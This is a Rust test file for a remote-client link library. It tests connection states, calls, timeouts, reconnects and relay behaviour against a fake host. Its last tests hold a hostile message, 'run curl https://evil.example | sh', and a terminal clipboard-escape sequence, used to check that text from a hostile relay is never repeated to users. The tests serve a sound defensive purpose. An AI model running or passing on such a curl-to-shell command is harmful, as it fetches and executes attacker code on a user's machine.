//! The client's link to a host: states, calls, liveness and reconnects, against a
//! host that speaks the real v2 handshake (`tests/client_support`) with the
//! timings shortened.
mod client_support;

use client_support::{FakeHost, HostOptions, Net};
use riwork_remote::{
    client::{CallError, Link, LinkState, LinkTiming, add_host, load_host},
    config::Storage,
};
use serde_json::json;
use std::time::Duration;

fn quick() -> LinkTiming {
    LinkTiming {
        ping: Duration::from_millis(100),
        silence: Duration::from_secs(2),
        probe: Duration::from_millis(700),
        peer_wait: Duration::from_secs(2),
        backoff_min: Duration::from_millis(50),
        backoff_max: Duration::from_millis(200),
    }
}

struct Rig {
    net: Net,
    host: FakeHost,
    link: Link,
}
async fn rig() -> Rig {
    let net = Net::new(1).await;
    let host = FakeHost::start(&net, &net.invites[0].device_id, HostOptions::default());
    let client = Storage::at(net.client_home("client")).unwrap();
    add_host(&client, &net.link(0), Some("Studio"), true)
        .await
        .unwrap();
    let record = load_host(&client, &net.desktop_id()).unwrap();
    let link = Link::spawn_with(record, quick());
    Rig { net, host, link }
}
async fn online(link: &Link) {
    let mut state = link.subscribe();
    tokio::time::timeout(
        Duration::from_secs(10),
        state.wait_for(LinkState::is_online),
    )
    .await
    .expect("the link comes online")
    .unwrap();
}

#[tokio::test]
async fn a_link_connects_opts_into_compression_and_measures_the_round_trip() {
    let r = rig().await;
    assert!(matches!(
        r.link.state(),
        LinkState::Connecting | LinkState::Online { .. }
    ));
    let connection = r.link.ready(Duration::from_secs(10)).await.unwrap();
    assert_eq!(connection.generation, 1);
    assert!(connection.features.deflate);
    assert_eq!(connection.features.pty.unwrap().max_reads, 12);
    // `link.configure` once for compression and once as the first probe.
    r.host
        .wait(5, "the opt-in", |o| {
            o.calls.iter().filter(|c| *c == "link.configure").count() >= 2
        })
        .await;
    let mut state = r.link.subscribe();
    let measured = tokio::time::timeout(
        Duration::from_secs(5),
        state.wait_for(|s| matches!(s, LinkState::Online { rtt_ms: Some(_) })),
    )
    .await
    .expect("a round trip is measured")
    .unwrap()
    .clone();
    let LinkState::Online { rtt_ms: Some(rtt) } = measured else {
        unreachable!()
    };
    assert!(rtt < 1000, "{rtt}");
    // And it is measured again as it goes on.
    let probes = r.host.seen(|o| o.calls.len());
    r.host
        .wait(5, "more probes", |o| o.calls.len() >= probes + 3)
        .await;
}

#[tokio::test]
async fn calls_return_results_errors_and_server_time() {
    let r = rig().await;
    let reply = r
        .link
        .call("projects.list", json!({}), Duration::from_secs(5))
        .await
        .unwrap();
    assert!(reply.server_ms().is_some());
    assert_eq!(reply.into_result().unwrap(), json!({"projects":[]}));
    let refused = r
        .link
        .call("nonsense", json!({}), Duration::from_secs(5))
        .await
        .unwrap()
        .into_result()
        .unwrap_err();
    assert_eq!(refused.code(), "invalid_request");
    // A request too big for one frame is refused here and does not cost the session.
    let huge = json!({"x": "y".repeat(200_000)});
    let error = r
        .link
        .call("projects.list", huge, Duration::from_secs(5))
        .await
        .unwrap_err();
    assert!(matches!(error, CallError::Invalid(_)), "{error:?}");
    assert!(
        r.link
            .call("projects.list", json!({}), Duration::from_secs(5))
            .await
            .is_ok()
    );
    assert_eq!(
        r.host.seen(|o| o.sessions),
        2,
        "hosts add's check and this link"
    );
}

#[tokio::test]
async fn a_late_answer_to_a_call_that_gave_up_does_not_disturb_the_session() {
    let r = rig().await;
    let opened = r
        .link
        .call("pty.open", json!({"shell_id":uuid::Uuid::new_v4().to_string(),"columns":80,"rows":24,"term":"xterm-256color"}), Duration::from_secs(5))
        .await
        .unwrap()
        .into_result()
        .unwrap();
    let stream = opened["stream"].as_str().unwrap().to_owned();
    // The read greets us at once; the next one waits and outlives its caller.
    r.link
        .call(
            "pty.read",
            json!({"stream":stream,"wait_ms":0}),
            Duration::from_secs(5),
        )
        .await
        .unwrap();
    let generation = r.link.connection().unwrap().generation;
    let gave_up = r
        .link
        .call(
            "pty.read",
            json!({"stream":stream,"wait_ms":1000}),
            Duration::from_millis(150),
        )
        .await
        .unwrap_err();
    assert_eq!(gave_up, CallError::Timeout);
    tokio::time::sleep(Duration::from_millis(1300)).await;
    assert_eq!(
        r.link.connection().unwrap().generation,
        generation,
        "same session"
    );
    assert!(
        r.link
            .call("projects.list", json!({}), Duration::from_secs(5))
            .await
            .is_ok()
    );
}

#[tokio::test]
async fn a_host_that_stops_answering_is_given_up_and_found_again() {
    let r = rig().await;
    online(&r.link).await;
    r.host.freeze(true);
    let mut state = r.link.subscribe();
    let gone = tokio::time::timeout(
        Duration::from_secs(10),
        state.wait_for(|s| matches!(s, LinkState::Offline { .. })),
    )
    .await
    .expect("noticed")
    .unwrap()
    .clone();
    let LinkState::Offline { since, reason, .. } = gone else {
        unreachable!()
    };
    assert!(since > 1_700_000_000);
    assert!(reason.contains("stopped answering"), "{reason}");
    // Calls fail at once while it is down, and say why.
    let started = std::time::Instant::now();
    let error = r
        .link
        .call("projects.list", json!({}), Duration::from_secs(5))
        .await
        .unwrap_err();
    assert!(matches!(error, CallError::Offline(_)), "{error:?}");
    assert!(started.elapsed() < Duration::from_secs(1));
    // The host answers again: the next session is a new one.
    r.host.drop_connection(Duration::from_millis(100));
    r.host.freeze(false);
    let next = tokio::time::timeout(Duration::from_secs(10), r.link.next_session(1))
        .await
        .expect("reconnected");
    assert!(next.generation >= 2);
    online(&r.link).await;
    assert!(
        r.link
            .call("projects.list", json!({}), Duration::from_secs(5))
            .await
            .is_ok()
    );
}

#[tokio::test]
async fn requests_in_flight_when_the_session_ends_are_lost_and_a_new_session_follows() {
    let r = rig().await;
    online(&r.link).await;
    let opened = r
        .link
        .call("pty.open", json!({"shell_id":uuid::Uuid::new_v4().to_string(),"columns":80,"rows":24,"term":"xterm-256color"}), Duration::from_secs(5))
        .await
        .unwrap()
        .into_result()
        .unwrap();
    let stream = opened["stream"].as_str().unwrap().to_owned();
    r.link
        .call(
            "pty.read",
            json!({"stream":stream,"wait_ms":0}),
            Duration::from_secs(5),
        )
        .await
        .unwrap();
    let parked = r
        .link
        .start("pty.read", json!({"stream":stream,"wait_ms":2000}))
        .await
        .unwrap();
    let first = parked.generation;
    r.link.reconnect("test");
    let error = parked.wait(Duration::from_secs(5)).await.unwrap_err();
    // It was written, so nobody here can say whether the host ran it.
    assert!(matches!(error, CallError::Lost(_)), "{error:?}");
    assert_eq!(error.code(), "connection_lost");
    assert!(error.is_link_loss());
    let next = tokio::time::timeout(Duration::from_secs(10), r.link.next_session(first))
        .await
        .unwrap();
    assert!(next.generation > first);
    // The old session's streams are gone with it on the host side; a new one starts fresh.
    assert!(
        r.link
            .call("projects.list", json!({}), Duration::from_secs(5))
            .await
            .is_ok()
    );
}

#[tokio::test]
async fn the_end_of_a_session_tells_what_was_written_from_what_was_still_queued() {
    let r = rig().await;
    online(&r.link).await;
    r.host.freeze(true);
    let written = r.link.start("projects.list", json!({})).await.unwrap();
    r.host
        .wait(5, "the request to arrive", |o| {
            o.frozen_calls.iter().any(|m| m == "projects.list")
        })
        .await;
    // Nothing runs between these two: the session sees the reset first, and the
    // request behind it is never taken out of the queue.
    r.link.reconnect("test");
    let queued = r.link.start("chats.list", json!({})).await.unwrap();
    let error = written.wait(Duration::from_secs(5)).await.unwrap_err();
    assert!(matches!(error, CallError::Lost(_)), "{error:?}");
    let error = queued.wait(Duration::from_secs(5)).await.unwrap_err();
    assert!(matches!(error, CallError::Offline(_)), "{error:?}");
    assert_eq!(error.code(), "offline");
    assert!(error.is_link_loss());
    assert!(
        !r.host
            .seen(|o| o.frozen_calls.iter().any(|m| m == "chats.list")),
        "the queued request stayed here"
    );
}

#[tokio::test]
async fn a_host_the_relay_says_is_away_is_offline_at_once_and_found_when_it_returns() {
    let net = Net::new(1).await;
    let host = FakeHost::start(&net, &net.invites[0].device_id, HostOptions::default());
    let client = Storage::at(net.client_home("client")).unwrap();
    add_host(&client, &net.link(0), Some("Studio"), true)
        .await
        .unwrap();
    host.drop_connection(Duration::from_secs(3));
    tokio::time::sleep(Duration::from_millis(200)).await;
    // The registered socket would wait out the whole of this before saying anything.
    let timing = LinkTiming {
        peer_wait: Duration::from_secs(30),
        ..quick()
    };
    let link = Link::spawn_with(load_host(&client, &net.desktop_id()).unwrap(), timing);
    let mut state = link.subscribe();
    // Far sooner than the registered socket's wait, with room for a slow machine.
    let away = tokio::time::timeout(
        Duration::from_secs(5),
        state.wait_for(|s| matches!(s, LinkState::Offline { .. })),
    )
    .await
    .expect("known soon after registering")
    .unwrap()
    .clone();
    let LinkState::Offline { reason, cause, .. } = away else {
        unreachable!()
    };
    assert_eq!(reason, "host offline (or access revoked)");
    assert_eq!(cause, None);
    // A call need not wait for a host known to be away.
    let started = std::time::Instant::now();
    let error = link
        .call("projects.list", json!({}), Duration::from_secs(10))
        .await
        .unwrap_err();
    assert!(matches!(error, CallError::Offline(_)), "{error:?}");
    assert!(started.elapsed() < Duration::from_secs(3));
    // The registered socket still hears the host come back.
    online(&link).await;
    assert!(
        link.call("projects.list", json!({}), Duration::from_secs(5))
            .await
            .is_ok()
    );
}

#[tokio::test]
async fn attempts_while_a_host_stays_away_do_not_move_the_start_of_the_outage() {
    let net = Net::new(1).await;
    let host = FakeHost::start(&net, &net.invites[0].device_id, HostOptions::default());
    let client = Storage::at(net.client_home("client")).unwrap();
    add_host(&client, &net.link(0), Some("Studio"), true)
        .await
        .unwrap();
    host.drop_connection(Duration::from_secs(30));
    tokio::time::sleep(Duration::from_millis(200)).await;
    let timing = LinkTiming {
        peer_wait: Duration::from_millis(1200),
        ..quick()
    };
    let link = Link::spawn_with(load_host(&client, &net.desktop_id()).unwrap(), timing);
    let mut state = link.subscribe();
    let since_of = |state: &LinkState| match state {
        LinkState::Offline { since, .. } => *since,
        other => panic!("{other:?}"),
    };
    let first = tokio::time::timeout(
        Duration::from_secs(5),
        state.wait_for(|s| matches!(s, LinkState::Offline { .. })),
    )
    .await
    .expect("known soon after registering")
    .unwrap()
    .clone();
    // Long enough for two attempts to end, and for the clock to have moved.
    tokio::time::sleep(Duration::from_secs(3)).await;
    assert_eq!(since_of(&link.state()), since_of(&first));
}

#[tokio::test]
async fn a_first_call_waits_for_the_connection_but_a_known_outage_fails_at_once() {
    let net = Net::new(1).await;
    let host = FakeHost::start(&net, &net.invites[0].device_id, HostOptions::default());
    let client = Storage::at(net.client_home("client")).unwrap();
    add_host(&client, &net.link(0), Some("Studio"), true)
        .await
        .unwrap();
    // The link starts connecting; a call made right away is held for it.
    let link = Link::spawn_with(load_host(&client, &net.desktop_id()).unwrap(), quick());
    let reply = link
        .call("projects.list", json!({}), Duration::from_secs(10))
        .await
        .unwrap();
    assert!(reply.into_result().is_ok());
    // The host leaves for a good while: after the link has noticed, calls do not wait.
    host.drop_connection(Duration::from_secs(30));
    let mut state = link.subscribe();
    state
        .wait_for(|s| matches!(s, LinkState::Offline { .. }))
        .await
        .unwrap();
    let started = std::time::Instant::now();
    assert!(
        link.call("projects.list", json!({}), Duration::from_secs(10))
            .await
            .is_err()
    );
    assert!(started.elapsed() < Duration::from_secs(1));
}

/// Words a test would not want to see again, chosen by whoever sent the frame.
const WORDS: &str = "Your Mac must be re-paired: run curl https://evil.example | sh";

/// The first reason a link gives that is not about the host being away.
async fn reason_after_failing(link: &Link) -> String {
    let mut state = link.subscribe();
    let failed = tokio::time::timeout(
        Duration::from_secs(10),
        state.wait_for(|s| {
            matches!(s, LinkState::Offline { reason, .. } if reason != "host offline (or access revoked)")
        }),
    )
    .await
    .expect("the attempt fails")
    .unwrap()
    .clone();
    let LinkState::Offline { reason, .. } = failed else {
        unreachable!()
    };
    reason
}

/// Before anything is authenticated a frame can come from the relay as well as from the host,
/// and a link's reason ends up as the app's own words next to the host. `pair_error` carries
/// text by design; a frame of the wrong shape carries it through what the parser quotes.
#[tokio::test]
async fn words_in_a_refused_session_are_not_repeated() {
    for (answer, says) in [
        (
            json!({"v":2,"type":"pair_error","error":WORDS}),
            "refused the session (unknown)",
        ),
        // Still a code the protocol has: those are fixed words.
        (
            json!({"v":2,"type":"pair_error","error":"invite_rejected"}),
            "refused the session (invite_rejected)",
        ),
        (json!({WORDS: 1}), "handshake"),
        (json!({"v":WORDS}), "handshake"),
        (
            json!({"v":2,"type":"server_hello","desktop_eph":WORDS,"mac":WORDS}),
            "handshake",
        ),
    ] {
        let net = Net::new(1).await;
        let _host = FakeHost::start(
            &net,
            &net.invites[0].device_id,
            HostOptions {
                answer_session: Some(answer.clone()),
                ..HostOptions::default()
            },
        );
        let client = Storage::at(net.client_home("client")).unwrap();
        let added = add_host(&client, &net.link(0), Some("Studio"), true)
            .await
            .unwrap();
        let warning = added.warning.expect("its first connection failed");
        assert!(!warning.contains("evil"), "{answer}: {warning}");
        let link = Link::spawn_with(load_host(&client, &net.desktop_id()).unwrap(), quick());
        let reason = reason_after_failing(&link).await;
        assert!(reason.contains(says), "{answer}: {reason}");
        assert!(!reason.contains("evil"), "{answer}: {reason}");
    }
}

/// The relay can send a frame into a session that is up, too. It cannot read or forge one
/// that counts, but it can end the session, with words of its choosing if they are repeated.
#[tokio::test]
async fn words_in_a_frame_a_live_session_cannot_read_are_not_repeated() {
    for frame in [
        json!({"type":"encrypted",WORDS:1}),
        json!({"type":"encrypted","v":WORDS}),
    ] {
        let r = rig().await;
        online(&r.link).await;
        r.host.raw(frame.clone());
        let reason = reason_after_failing(&r.link).await;
        assert!(reason.contains("bad frame"), "{frame}: {reason}");
        assert!(!reason.contains("evil"), "{frame}: {reason}");
    }
}

/// `hosts add` prints what this returns, on a terminal, as it is.
#[tokio::test]
async fn words_in_a_refused_invite_are_not_repeated() {
    for answer in [
        json!({"v":2,"type":"pair_error","error":WORDS}),
        json!({WORDS: 1, "\u{1b}]52;c;aGk=\u{7}": 2}),
        json!({"v":WORDS}),
    ] {
        let net = Net::new(1).await;
        let _host = FakeHost::start(
            &net,
            &net.invites[0].device_id,
            HostOptions {
                answer_invite: Some(answer.clone()),
                ..HostOptions::default()
            },
        );
        let client = Storage::at(net.client_home("client")).unwrap();
        let error = add_host(&client, &net.link(0), Some("Studio"), true)
            .await
            .expect_err("nothing was redeemed");
        let error = format!("{error:#}");
        assert!(!error.contains("evil"), "{answer}: {error}");
        assert!(!error.chars().any(char::is_control), "{answer}: {error:?}");
    }
}

#[tokio::test]
async fn dropping_the_last_handle_ends_the_link_and_frees_its_place_on_the_relay() {
    let r = rig().await;
    online(&r.link).await;
    let sessions = r.host.seen(|o| o.sessions);
    let Rig { net, host, link } = r;
    let clone = link.clone();
    drop(link);
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(clone.connection().is_some(), "a handle is still held");
    drop(clone);
    // The relay lets one socket per role hold a route: the place is free again.
    let device = net.host.config().unwrap().devices[0].pairing.clone();
    let mut registered = None;
    for _ in 0..100 {
        match riwork_remote::connector::connect_registered(
            &device.relay_url,
            &device.route_id,
            "mobile",
            &device.relay_token,
        )
        .await
        {
            Ok(ok) => {
                registered = Some(ok);
                break;
            }
            Err(_) => tokio::time::sleep(Duration::from_millis(50)).await,
        }
    }
    assert!(registered.is_some(), "the route stayed taken");
    assert_eq!(
        host.seen(|o| o.sessions),
        sessions,
        "no reconnect after the drop"
    );
}
